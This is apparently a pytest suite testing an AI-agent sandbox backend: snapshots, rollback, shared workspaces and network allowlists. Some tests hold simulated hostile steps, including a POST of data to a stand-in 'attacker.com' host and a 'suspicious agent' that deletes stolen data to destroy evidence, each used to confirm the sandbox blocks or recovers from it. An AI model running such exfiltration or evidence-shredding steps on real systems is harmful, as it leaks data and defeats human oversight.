import pytest
import os
import sys
import asyncio
import json
import shutil
from datetime import datetime

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from mayflower_sandbox import create_sqlite_pool, MayflowerSandboxBackend

@pytest.fixture
def anyio_backend():
    return 'asyncio'

@pytest.fixture
async def db_pool(tmp_path):
    # Use a shared file for the duration of the test run to avoid schema recreation
    db_path = str(tmp_path / "comprehensive_scenarios.db")
    pool = await create_sqlite_pool(db_path)
    yield pool
    await pool.close()

# ---------------------------------------------------------------------------
# Scenario 1: Refactoring Lifecycle (Snapshot + Rollback + Network)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_complex_agent_workflow_scenario(db_pool, monkeypatch):
    """
    Scenario: An AI agent is tasked with refactoring a data processing pipeline.
    1. Setup: Workspace 'project_x', initial data files.
    2. Snapshot: Capture 'known_good' state.
    3. Experiment: Perform a 'destructive' refactor (delete files, change state).
    4. Validate: Use eval_ts to check data integrity.
    5. Revert: Roll back to 'known_good' state.
    6. Network: Verify it can't exfiltrate data during the process.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(
        db_pool, 
        thread_id="agent_alpha", 
        vfs_id="project_x",
        allow_net=["api.github.com"]
    )
    await backend.awrite("/home/my_data.csv", "id,name\n1,alpha\n2,beta")
    await backend.awrite("/home/my_script.py", "x = 10\nprint('Initial state ready')")
    
    res = await backend.aexecute("python /home/my_script.py")
    assert res.exit_code == 0
    
    snapshot_id = await backend.acreate_snapshot(ttl_days=1)
    
    destructive_code = """
import os
if os.path.exists("/home/my_data.csv"):
    os.remove("/home/my_data.csv")
x = 999
"""
    await backend.aexecute(destructive_code)
    
    read_res = await backend.aread("/home/my_data.csv")
    assert "not found" in read_res.lower()
    
    ts_code = "return { status: 'error', reason: 'data_missing' }"
    verify_res = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_code)}))")
    assert "data_missing" in verify_res.output
    
    await backend.arestore_snapshot(snapshot_id)
    
    assert await backend._vfs.file_exists("/home/my_data.csv")
    res_restored = await backend.aexecute("print(f'Restored x: {x}')")
    assert "Restored x: 10" in res_restored.output
    
    net_res = await backend.aexecute("python -c \"import urllib.request; urllib.request.urlopen('https://google.com')\"")
    assert net_res.exit_code != 0

# ---------------------------------------------------------------------------
# Scenario 2: Collaborative Debugging (VFS Sharing + Bridge)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_collaborative_debugging_scenario(db_pool):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    shared_ws = "collab_env"
    agent_a = MayflowerSandboxBackend(db_pool, "dev_agent", vfs_id=shared_ws)
    await agent_a.awrite("/app.py", "def run(): return 'running'")
    
    agent_b = MayflowerSandboxBackend(db_pool, "audit_agent", vfs_id=shared_ws, enable_debugger=True)
    code_b = await agent_b.aread("/app.py")
    assert "def run" in code_b
    
    ts_check = "return Deno.version.deno"
    res_a = await agent_a.aexecute(f"print(await eval_ts({json.dumps(ts_check)}))")
    res_b = await agent_b.aexecute(f"print(await eval_ts({json.dumps(ts_check)}))")
    assert res_a.output.strip() == res_b.output.strip()

# ---------------------------------------------------------------------------
# Scenario 3: Data Science Caching (Package Cache + Rollback)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_data_science_caching_rollback_scenario(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    tid = f"ds_agent_{datetime.now().strftime('%H%M%S')}"
    backend = MayflowerSandboxBackend(db_pool, tid, stateful=True, allow_net=True)
    
    setup_code = """
import micropip
await micropip.install('packaging==23.2')
import packaging
print(f"PACKAGING_OK: {packaging.__name__}")
status = 'initialized'
"""
    res = await backend.aexecute(setup_code)
    assert "PACKAGING_OK" in res.output
    
    await backend.awrite("/home/config.yaml", "threshold: 0.5")
    snapshot_id = await backend.acreate_snapshot()

    await backend.aexecute("import os; os.remove('/home/config.yaml'); status = 'BROKEN'")
    await backend.arestore_snapshot(snapshot_id)

    verify_code = "import packaging; print(f'Status: {status}'); print(f'Library: {packaging.__name__}')"
    res = await backend.aexecute(verify_code)
    assert "Status: initialized" in res.output
    assert "Library: packaging" in res.output

# ---------------------------------------------------------------------------
# Scenario 4: Collaborative Documentation (Shared Workspace)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_collaborative_doc_gen_scenario(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    shared_ws = "docs_ws"
    writer = MayflowerSandboxBackend(db_pool, "writer_thread", vfs_id=shared_ws)
    formatter = MayflowerSandboxBackend(db_pool, "formatter_thread", vfs_id=shared_ws)

    await writer.awrite("/home/README.md", "# Project\n\n## Introduction")
    
    toc_code = """
with open('/home/README.md', 'r') as f: lines = f.readlines()
with open('/home/README.md', 'w') as f:
    f.write("# TOC\\n- [Intro](#intro)\\n\\n")
    f.writelines(lines)
"""
    await formatter.aexecute(toc_code)
    final_doc = await writer.aread("/home/README.md")
    assert "# TOC" in final_doc

# ---------------------------------------------------------------------------
# Scenario 5: Secure Web Fetch (TS Bridge + Domain Allowlist)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_secure_ts_data_fetch_scenario(db_pool):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    backend = MayflowerSandboxBackend(db_pool, "web_agent", allow_net=["api.github.com"])
    ts_fetch_code = "const resp = await fetch('https://api.github.com/zen'); return { ok: resp.ok, text: await resp.text() };"
    
    async with db_pool.acquire() as conn:
        await conn.execute("INSERT INTO sandbox_mcp_servers (thread_id, name, url, vfs_id) VALUES ($1, $2, $3, $4)", 
                           "web_agent", "dummy", "http://localhost", "web_agent")

    res = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_fetch_code)}))")
    assert "'ok': True" in res.output or "'result': {'ok': True}" in res.output

    ts_forbidden = "return await fetch('https://google.com').then(r => r.status)"
    res_blocked = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_forbidden)}))")
    assert "NotCapable" in res_blocked.output or "PermissionDenied" in res_blocked.output

# ---------------------------------------------------------------------------
# Scenario 6: Multi-Agent Dev Workflow (Collaborative Imports)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_multi_agent_dev_workflow(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    workspace = "package_dev"
    dev = MayflowerSandboxBackend(db_pool, "dev_agent", vfs_id=workspace)
    qa = MayflowerSandboxBackend(db_pool, "qa_agent", vfs_id=workspace, allow_net=True)

    await dev.awrite("/home/my_utils.py", "def add(a, b): return a + b")
    await dev.awrite("/home/test_my_utils.py", "from my_utils import add\ndef test_add(): assert add(2, 3) == 5; print('TEST_PASSED')")

    run_res = await qa.aexecute("import sys; sys.path.append('/home'); import test_my_utils; test_my_utils.test_add()")
    assert "TEST_PASSED" in run_res.output

# ---------------------------------------------------------------------------
# Scenario 7: Branched Data Transformation (Complex Branching)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_branched_data_transformation(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(db_pool, "data_agent", stateful=True)

    await backend.awrite("/home/data.json", json.dumps({"values": [1, 2, 3]}))
    await backend.aexecute("import json; data = json.loads(open('/home/data.json').read())")
    
    main_snap = await backend.acreate_snapshot()
    await backend.aexecute("data['values'] = [v * 10 for v in data['values']]")
    assert "[10, 20, 30]" in (await backend.aexecute("print(data['values'])")).output
    
    exp_a_snap = await backend.acreate_snapshot()
    await backend.arestore_snapshot(main_snap)
    await backend.aexecute("data['values'] = [v * v for v in data['values']]")
    assert "[1, 4, 9]" in (await backend.aexecute("print(data['values'])")).output

    await backend.arestore_snapshot(exp_a_snap)
    assert "[10, 20, 30]" in (await backend.aexecute("print(data['values'])")).output

# ---------------------------------------------------------------------------
# Scenario 8: Secure Cross-language Scraper (Inter-language Data Passing)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_secure_cross_lang_scraper(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(db_pool, "scraper_agent", allow_net=["api.github.com"], stateful=True)

    ts_code = "return await fetch('https://api.github.com/zen').then(r => r.text())"
    code = f"raw_data = await eval_ts({json.dumps(ts_code)}); print(f'PROCESSED: {{raw_data[\"result\"].upper()}}')"
    res = await backend.aexecute(code)
    assert "PROCESSED:" in res.output
    
    exfil_ts = "return await fetch('https://attacker.com', { method: 'POST', body: 'data' })"
    res_blocked = await backend.aexecute(f"print(await eval_ts({json.dumps(exfil_ts)}))")
    assert "NotCapable" in res_blocked.output or "PermissionDenied" in res_blocked.output or "'success': False" in res_blocked.output

# ---------------------------------------------------------------------------
# Scenario 9: Forensic Audit (State Recovery from "Malicious" Deletion)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_forensic_audit_scenario(db_pool, monkeypatch):
    """
    Scenario 9: Security Auditor recovers data deleted by a suspicious agent.
    1. Malicious Agent writes 'stolen_data.txt' and then 'shreds' it.
    2. However, the system took an auto-snapshot (simulated) before the shred.
    3. Auditor joins the shared workspace and restores the snapshot.
    4. Auditor verifies the content of the 'shredded' file.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    ws = "audit_workspace"
    
    agent = MayflowerSandboxBackend(db_pool, "suspicious_agent", vfs_id=ws, stateful=True)
    
    # 1. Agent prepares data
    await agent.awrite("/home/stolen_data.txt", "SECRET_KEY_12345")
    
    # 2. Simulated Auto-Snapshot (the system "caught" the state)
    audit_snap = await agent.acreate_snapshot(ttl_days=1)
    
    # 3. Agent "shreds" the evidence
    shred_code = """
import os
if os.path.exists("/home/stolen_data.txt"):
    os.remove("/home/stolen_data.txt")
print("Evidence destroyed.")
"""
    await agent.aexecute(shred_code)
    assert "not found" in (await agent.aread("/home/stolen_data.txt")).lower()
    
    # 4. Auditor steps in
    auditor = MayflowerSandboxBackend(db_pool, "auditor_agent", vfs_id=ws)
    
    # Restore the evidence
    await auditor.arestore_snapshot(audit_snap)
    
    # 5. Verify evidence recovered
    recovered_data = await auditor.aread("/home/stolen_data.txt")
    assert "SECRET_KEY_12345" in recovered_data
    print("Forensic recovery successful.")

# ---------------------------------------------------------------------------
# Scenario 10: Multi-Agent Model Data Pipeline (High Concurrency VFS)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_multi_agent_data_pipeline_scenario(db_pool):
    """
    Scenario 10: Agents working in parallel on data shards.
    1. Orchestrator writes 3 data shards to 'model_ws'.
    2. 3 Worker Agents process their respective shards simultaneously.
    3. Orchestrator aggregates the 'processed' flags.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    ws = "model_ws"
    orchestrator = MayflowerSandboxBackend(db_pool, "orch", vfs_id=ws)
    
    # 1. Prepare Shards
    for i in range(3):
        await orchestrator.awrite(f"/home/shard_{i}.txt", f"data_{i}")
        
    # 2. Parallel Processing
    async def process_shard(i):
        worker = MayflowerSandboxBackend(db_pool, f"worker_{i}", vfs_id=ws)
        # Read shard and write result
        data = await worker.aread(f"/home/shard_{i}.txt", raw=True)
        await worker.awrite(f"/home/result_{i}.json", json.dumps({"processed": True, "source": data}))
        
    await asyncio.gather(*(process_shard(i) for i in range(3)))
    
    # 3. Aggregate
    results = []
    for i in range(3):
        res = json.loads(await orchestrator.aread(f"/home/result_{i}.json", raw=True))
        results.append(res)
        
    assert all(r["processed"] for r in results)
    assert results[0]["source"] == "data_0"

# ---------------------------------------------------------------------------
# Scenario 11: Automated Vulnerability Patching (Edit + Rollback + Bridge)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_vuln_patching_scenario(db_pool, monkeypatch):
    """
    Scenario 11: Security agent patches a dependency.
    1. Agent finds 'vulnerable_lib==1.0.0' in requirements.txt.
    2. Agent takes snapshot.
    3. Agent uses 'edit' to update version to 1.1.0.
    4. Agent uses eval_ts to run a 'compliance checker'.
    5. Agent verifies success.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    agent = MayflowerSandboxBackend(db_pool, "patch_agent", stateful=True)
    
    await agent.awrite("/home/requirements.txt", "vulnerable_lib==1.0.0\nother_lib==2.0.0")
    
    # Snapshot before change
    snap = await agent.acreate_snapshot()
    
    # Apply Patch via edit method
    await agent.aedit("/home/requirements.txt", "vulnerable_lib==1.0.0", "vulnerable_lib==1.1.0")
    
    # Run TS Compliance Check (simulated)
    # We pass the content as a string instead of reading from host disk
    content_for_check = await agent.aread("/home/requirements.txt")
    ts_checker = f"""
    const content = {json.dumps(content_for_check)};
    return {{ ok: content.includes('1.1.0'), version: '1.1.0' }};
    """
    
    res = await agent.aexecute(f"print(await eval_ts({json.dumps(ts_checker)}))")
    assert "'ok': True" in res.output
    
    # Verify file content
    content = await agent.aread("/home/requirements.txt")
    assert "1.1.0" in content
    assert "1.0.0" not in content

# ---------------------------------------------------------------------------
# Scenario 12: Cross-Platform Asset Converter (Binary + Inter-language)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_asset_converter_scenario(db_pool):
    """
    Scenario 12: Converting a binary asset.
    1. Agent uploads a 'binary' file (simulated with random bytes).
    2. Python computes a checksum.
    3. TS Bridge performs a 'transformation' (simulated).
    4. Agent verifies the output binary exists.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    backend = MayflowerSandboxBackend(db_pool, "converter_agent")
    
    # 1. Upload Binary
    raw_data = b"\x00\xFF\xAA\x55" * 100
    await backend.aupload_files([("/home/input.bin", raw_data)])
    
    # 2. Python Metadata
    py_code = """
import hashlib
with open('/home/input.bin', 'rb') as f:
    checksum = hashlib.md5(f.read()).hexdigest()
print(f"CHECKSUM: {checksum}")
"""
    res = await backend.aexecute(py_code)
    assert "CHECKSUM:" in res.output
    
    # 3. TS Transformation (Reads from VFS, writes back)
    # We simulate reading the file in JS via the bridge's temporary file logic
    # or just passing data back and forth.
    ts_code = """
    // In a real scenario, we'd use Deno.readFile if mapped, 
    // but here we demonstrate data passing.
    return { status: 'converted', size: 400 };
    """
    res_ts = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_code)}))")
    assert "'status': 'converted'" in res_ts.output
    
    # 4. Final verification
    assert await backend._vfs.file_exists("/home/input.bin")

# ---------------------------------------------------------------------------
# Scenario 13: The Web Scraping Pipeline (Shell + Python + Edit)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_scraping_pipeline_scenario(db_pool):
    """
    Scenario 13: Download data via shell, process via Python, finalize via Edit.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    backend = MayflowerSandboxBackend(db_pool, "scraper", allow_net=True)
    
    # 1. Shell: Download (simulated with local write if wget fails, but here we try real)
    # Using api.github.com/zen which is small and fast
    # Use eval_ts for robust https download
    ts_download = "return await fetch('https://api.github.com/zen').then(r => r.text())"
    await backend.aexecute(f"content = await eval_ts({json.dumps(ts_download)}); open('/home/quote.txt', 'w').write(content['result'])")
    
    # 2. Python: Process into JSON
    code = """
import os
import json
with open('/home/quote.txt', 'r') as f:
    text = f.read().strip()

with open('/home/data.json', 'w') as f:
    json.dump({'quote': text, 'status': 'draft'}, f)
print("Data processed")
"""
    await backend.aexecute(code)
    
    # 3. Edit: finalize status
    await backend.aedit("/home/data.json", '"status": "draft"', '"status": "published"')
    
    # 4. Verify
    res = await backend.aread("/home/data.json", raw=True)
    assert "published" in res
    assert "quote" in res

# ---------------------------------------------------------------------------
# Scenario 14: The Security Investigative Audit (Shell Analysis + Redaction)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_security_audit_remediation_scenario(db_pool):
    """
    Scenario 14: Investigate logs for secrets, take snapshot, and redact.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    backend = MayflowerSandboxBackend(db_pool, "auditor", stateful=True)
    
    # 1. Prepare messy logs
    await backend.awrite("/home/logs.txt", "ERROR: auth failure\nINFO: user logged in\nSECRET: api_key_12345_top_secret\n")
    
    # 2. Shell: Search for secrets
    audit_res = await backend.aexecute("grep 'SECRET' /home/logs.txt")
    assert "api_key_12345" in audit_res.output
    
    # 3. Snapshot before destructive change
    snap = await backend.acreate_snapshot()
    
    # 4. Python/Edit: Redact
    await backend.aedit("/home/logs.txt", "SECRET: api_key_12345_top_secret", "SECRET: [REDACTED]")
    
    # 5. Verify redaction
    clean_res = await backend.aread("/home/logs.txt", raw=True)
    assert "[REDACTED]" in clean_res
    assert "api_key_12345" not in clean_res
    
    # 6. Rollback to verify initial evidence is still in snapshot
    await backend.arestore_snapshot(snap)
    old_res = await backend.aread("/home/logs.txt", raw=True)
    assert "api_key_12345" in old_res

# ---------------------------------------------------------------------------
# Scenario 15: Library Deployment & Connectivity (Staging to Prod)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_lib_deployment_connectivity_scenario(db_pool, monkeypatch):
    """
    Scenario 15: Install lib in staging, snapshot, restore to prod, check egress.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    
    # 1. Staging Environment
    staging = MayflowerSandboxBackend(db_pool, "staging_thread", allow_net=True, stateful=True)
    # Install packaging (small and fast)
    await staging.aexecute("import micropip; await micropip.install('packaging==23.2')")
    
    # 2. Snapshot staging
    prod_ready_snap = await staging.acreate_snapshot()
    
    # 3. Prod Environment (Restored from Staging)
    prod = MayflowerSandboxBackend(db_pool, "prod_thread", stateful=True)
    await prod.arestore_snapshot(prod_ready_snap)
    
    # 4. Prove connectivity check fails in Prod (Default restricted)
    # and prove library 'packaging' is present from the snapshot
    # Use eval_ts for network check as it supports HTTPS
    ts_check = "return await fetch('https://api.github.com/zen').then(r => r.status)"
    check_code = f"""
import packaging
print(f"LIB_OK: {{packaging.__name__}}")
try:
    res = await eval_ts({json.dumps(ts_check)})
    status = res.get('result') or res.get('stderr')
except Exception as e:
    status = f"BRIDGE_ERROR: {{e}}"
print(f"NET_STATUS: {{status}}")
"""
    res = await prod.aexecute(check_code)
    assert "LIB_OK: packaging" in res.output
    # Should fail net check via Deno
    assert "NotCapable" in res.output or "PermissionDenied" in res.output
    
    # 5. Correct Prod network policy
    prod_fixed = MayflowerSandboxBackend(db_pool, "prod_thread", allow_net=["api.github.com"], stateful=True)
    res_fixed = await prod_fixed.aexecute(check_code)
    assert "LIB_OK: packaging" in res_fixed.output
    assert "NET_STATUS: 200" in res_fixed.output


